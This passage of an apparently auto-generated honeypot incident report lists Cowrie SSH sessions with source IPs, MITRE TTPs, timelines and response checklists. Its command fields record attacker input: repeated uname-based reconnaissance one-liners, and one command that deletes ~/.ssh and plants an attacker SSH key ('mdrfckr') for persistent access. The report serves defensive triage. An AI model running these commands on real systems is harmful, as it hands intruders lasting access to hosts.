| `2026-09-21 11:35:24` | `cowrie.command.input` |
| `2026-09-21 11:35:24` | `cowrie.command.failed` |
| `2026-09-21 11:35:25` | `cowrie.log.closed` |
| `2026-09-21 11:35:26` | `cowrie.session.params` |
| `2026-09-21 11:35:26` | `cowrie.command.input` |
| `2026-09-21 11:35:26` | `cowrie.session.file_download` |
| `2026-09-21 11:35:26` | `cowrie.log.closed` |
| `2026-09-21 11:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.118.81[.]174` to AbuseIPDB if not already reported
- [ ] Block `74.118.81[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577328a082c0

| Field | Detail |
|---|---|
| **Source IP** | `74.118.81[.]174` |
| **First Seen** | 2026-09-21 11:35 |
| **Last Seen** | 2026-09-21 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:35:26` | `cowrie.session.connect` |
| `2026-09-21 11:35:26` | `cowrie.client.version` |
| `2026-09-21 11:35:26` | `cowrie.client.kex` |
| `2026-09-21 11:35:28` | `cowrie.login.success` |
| `2026-09-21 11:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.118.81[.]174` to AbuseIPDB if not already reported
- [ ] Block `74.118.81[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ec2a74e209

| Field | Detail |
|---|---|
| **Source IP** | `74.118.81[.]174` |
| **First Seen** | 2026-09-21 11:35 |
| **Last Seen** | 2026-09-21 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:35:28` | `cowrie.session.connect` |
| `2026-09-21 11:35:28` | `cowrie.client.version` |
| `2026-09-21 11:35:28` | `cowrie.client.kex` |
| `2026-09-21 11:35:29` | `cowrie.login.success` |
| `2026-09-21 11:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.118.81[.]174` to AbuseIPDB if not already reported
- [ ] Block `74.118.81[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b47448dd1d85

| Field | Detail |
|---|---|
| **Source IP** | `43.252.11[.]4` |
| **First Seen** | 2026-09-21 11:35 |
| **Last Seen** | 2026-09-21 11:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:35:41` | `cowrie.session.connect` |
| `2026-09-21 11:35:41` | `cowrie.client.version` |
| `2026-09-21 11:35:42` | `cowrie.client.kex` |
| `2026-09-21 11:35:43` | `cowrie.login.success` |
| `2026-09-21 11:35:44` | `cowrie.session.params` |
| `2026-09-21 11:35:44` | `cowrie.command.input` |
| `2026-09-21 11:35:44` | `cowrie.command.failed` |
| `2026-09-21 11:35:45` | `cowrie.log.closed` |
| `2026-09-21 11:35:46` | `cowrie.session.params` |
| `2026-09-21 11:35:46` | `cowrie.command.input` |
| `2026-09-21 11:35:47` | `cowrie.session.file_download` |
| `2026-09-21 11:35:47` | `cowrie.log.closed` |
| `2026-09-21 11:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.252.11[.]4` to AbuseIPDB if not already reported
- [ ] Block `43.252.11[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200e81861441

| Field | Detail |
|---|---|
| **Source IP** | `43.252.11[.]4` |
| **First Seen** | 2026-09-21 11:35 |
| **Last Seen** | 2026-09-21 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:35:47` | `cowrie.session.connect` |
| `2026-09-21 11:35:47` | `cowrie.client.version` |
| `2026-09-21 11:35:47` | `cowrie.client.kex` |
| `2026-09-21 11:35:48` | `cowrie.login.success` |
| `2026-09-21 11:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.252.11[.]4` to AbuseIPDB if not already reported
- [ ] Block `43.252.11[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5fe9b17eb80

| Field | Detail |
|---|---|
| **Source IP** | `43.252.11[.]4` |
| **First Seen** | 2026-09-21 11:35 |
| **Last Seen** | 2026-09-21 11:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:35:50` | `cowrie.session.connect` |
| `2026-09-21 11:35:50` | `cowrie.client.version` |
| `2026-09-21 11:35:50` | `cowrie.client.kex` |
| `2026-09-21 11:35:52` | `cowrie.login.success` |
| `2026-09-21 11:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.252.11[.]4` to AbuseIPDB if not already reported
- [ ] Block `43.252.11[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3132fa73e108

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-09-21 11:36 |
| **Last Seen** | 2026-09-21 11:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:36:04` | `cowrie.session.connect` |
| `2026-09-21 11:36:05` | `cowrie.client.version` |
| `2026-09-21 11:36:05` | `cowrie.client.kex` |
| `2026-09-21 11:36:06` | `cowrie.login.success` |
| `2026-09-21 11:36:07` | `cowrie.session.params` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.success` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:07` | `cowrie.command.input` |
| `2026-09-21 11:36:08` | `cowrie.log.closed` |
| `2026-09-21 11:36:09` | `cowrie.session.params` |
| `2026-09-21 11:36:09` | `cowrie.command.input` |
| `2026-09-21 11:36:09` | `cowrie.log.closed` |
| `2026-09-21 11:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b5dfffa45b

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:37 |
| **Last Seen** | 2026-09-21 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:37:44` | `cowrie.session.connect` |
| `2026-09-21 11:37:44` | `cowrie.client.version` |
| `2026-09-21 11:37:44` | `cowrie.client.kex` |
| `2026-09-21 11:37:44` | `cowrie.login.success` |
| `2026-09-21 11:37:44` | `cowrie.session.params` |
| `2026-09-21 11:37:44` | `cowrie.command.input` |
| `2026-09-21 11:37:45` | `cowrie.log.closed` |
| `2026-09-21 11:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255f3c4ada49

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-09-21 11:38 |
| **Last Seen** | 2026-09-21 11:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:38:04` | `cowrie.session.connect` |
| `2026-09-21 11:38:04` | `cowrie.client.version` |
| `2026-09-21 11:38:04` | `cowrie.client.kex` |
| `2026-09-21 11:38:05` | `cowrie.login.success` |
| `2026-09-21 11:38:07` | `cowrie.session.params` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.success` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.command.input` |
| `2026-09-21 11:38:07` | `cowrie.log.closed` |
| `2026-09-21 11:38:08` | `cowrie.session.params` |
| `2026-09-21 11:38:08` | `cowrie.command.input` |
| `2026-09-21 11:38:08` | `cowrie.log.closed` |
| `2026-09-21 11:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b0ce9569915

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-09-21 11:40 |
| **Last Seen** | 2026-09-21 11:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:40:15` | `cowrie.session.connect` |
| `2026-09-21 11:40:16` | `cowrie.client.version` |
| `2026-09-21 11:40:16` | `cowrie.client.kex` |
| `2026-09-21 11:40:17` | `cowrie.login.success` |
| `2026-09-21 11:40:19` | `cowrie.session.params` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.success` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:19` | `cowrie.command.input` |
| `2026-09-21 11:40:20` | `cowrie.log.closed` |
| `2026-09-21 11:40:21` | `cowrie.session.params` |
| `2026-09-21 11:40:21` | `cowrie.command.input` |
| `2026-09-21 11:40:21` | `cowrie.log.closed` |
| `2026-09-21 11:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705226c0f5e4

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:40 |
| **Last Seen** | 2026-09-21 11:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:40:22` | `cowrie.session.connect` |
| `2026-09-21 11:40:22` | `cowrie.client.version` |
| `2026-09-21 11:40:22` | `cowrie.client.kex` |
| `2026-09-21 11:40:22` | `cowrie.login.success` |
| `2026-09-21 11:40:23` | `cowrie.session.params` |
| `2026-09-21 11:40:23` | `cowrie.command.input` |
| `2026-09-21 11:40:23` | `cowrie.log.closed` |
| `2026-09-21 11:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d751c0e114c

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-21 11:41 |
| **Last Seen** | 2026-09-21 11:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:41:58` | `cowrie.session.connect` |
| `2026-09-21 11:41:58` | `cowrie.client.version` |
| `2026-09-21 11:41:58` | `cowrie.client.kex` |
| `2026-09-21 11:41:59` | `cowrie.login.success` |
| `2026-09-21 11:42:00` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:42:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 11:42:01` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:42:02` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:42:03` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 11:42:03` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:42:03` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:42:03` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 11:42:03` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299ce946e6e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-09-21 11:42 |
| **Last Seen** | 2026-09-21 11:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:42:10` | `cowrie.session.connect` |
| `2026-09-21 11:42:11` | `cowrie.client.version` |
| `2026-09-21 11:42:11` | `cowrie.client.kex` |
| `2026-09-21 11:42:13` | `cowrie.login.success` |
| `2026-09-21 11:42:14` | `cowrie.session.params` |
| `2026-09-21 11:42:14` | `cowrie.command.input` |
| `2026-09-21 11:42:14` | `cowrie.command.input` |
| `2026-09-21 11:42:14` | `cowrie.command.input` |
| `2026-09-21 11:42:14` | `cowrie.command.input` |
| `2026-09-21 11:42:15` | `cowrie.command.input` |
| `2026-09-21 11:42:15` | `cowrie.command.success` |
| `2026-09-21 11:42:15` | `cowrie.command.input` |
| `2026-09-21 11:42:15` | `cowrie.command.input` |
| `2026-09-21 11:42:15` | `cowrie.command.input` |
| `2026-09-21 11:42:15` | `cowrie.command.input` |
| `2026-09-21 11:42:15` | `cowrie.log.closed` |
| `2026-09-21 11:42:17` | `cowrie.session.params` |
| `2026-09-21 11:42:17` | `cowrie.command.input` |
| `2026-09-21 11:42:17` | `cowrie.log.closed` |
| `2026-09-21 11:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6eeb1532fc1

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:43 |
| **Last Seen** | 2026-09-21 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:43:06` | `cowrie.session.connect` |
| `2026-09-21 11:43:06` | `cowrie.client.version` |
| `2026-09-21 11:43:06` | `cowrie.client.kex` |
| `2026-09-21 11:43:07` | `cowrie.login.success` |
| `2026-09-21 11:43:07` | `cowrie.session.params` |
| `2026-09-21 11:43:07` | `cowrie.command.input` |
| `2026-09-21 11:43:07` | `cowrie.log.closed` |
| `2026-09-21 11:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14556ea8ebd5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-09-21 11:44 |
| **Last Seen** | 2026-09-21 11:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:44:03` | `cowrie.session.connect` |
| `2026-09-21 11:44:04` | `cowrie.client.version` |
| `2026-09-21 11:44:04` | `cowrie.client.kex` |
| `2026-09-21 11:44:06` | `cowrie.login.success` |
| `2026-09-21 11:44:08` | `cowrie.session.params` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.success` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.command.input` |
| `2026-09-21 11:44:08` | `cowrie.log.closed` |
| `2026-09-21 11:44:10` | `cowrie.session.params` |
| `2026-09-21 11:44:10` | `cowrie.command.input` |
| `2026-09-21 11:44:11` | `cowrie.log.closed` |
| `2026-09-21 11:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e5ac9e4cd2a

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:45 |
| **Last Seen** | 2026-09-21 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:45:47` | `cowrie.session.connect` |
| `2026-09-21 11:45:47` | `cowrie.client.version` |
| `2026-09-21 11:45:47` | `cowrie.client.kex` |
| `2026-09-21 11:45:47` | `cowrie.login.success` |
| `2026-09-21 11:45:48` | `cowrie.session.params` |
| `2026-09-21 11:45:48` | `cowrie.command.input` |
| `2026-09-21 11:45:48` | `cowrie.log.closed` |
| `2026-09-21 11:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2263d0b66ff9

| Field | Detail |
|---|---|
| **Source IP** | `193.187.110[.]214` |
| **First Seen** | 2026-09-21 11:45 |
| **Last Seen** | 2026-09-21 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:45:51` | `cowrie.session.connect` |
| `2026-09-21 11:45:51` | `cowrie.client.version` |
| `2026-09-21 11:45:52` | `cowrie.client.kex` |
| `2026-09-21 11:45:52` | `cowrie.login.success` |
| `2026-09-21 11:45:52` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:45:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-21 11:45:52` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:45:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.187.110[.]214` to AbuseIPDB if not already reported
- [ ] Block `193.187.110[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cdeaad6900a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-09-21 11:47 |
| **Last Seen** | 2026-09-21 11:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:47:38` | `cowrie.session.connect` |
| `2026-09-21 11:47:38` | `cowrie.client.version` |
| `2026-09-21 11:47:38` | `cowrie.client.kex` |
| `2026-09-21 11:47:40` | `cowrie.login.success` |
| `2026-09-21 11:47:42` | `cowrie.session.params` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
| `2026-09-21 11:47:42` | `cowrie.command.success` |
| `2026-09-21 11:47:42` | `cowrie.command.input` |
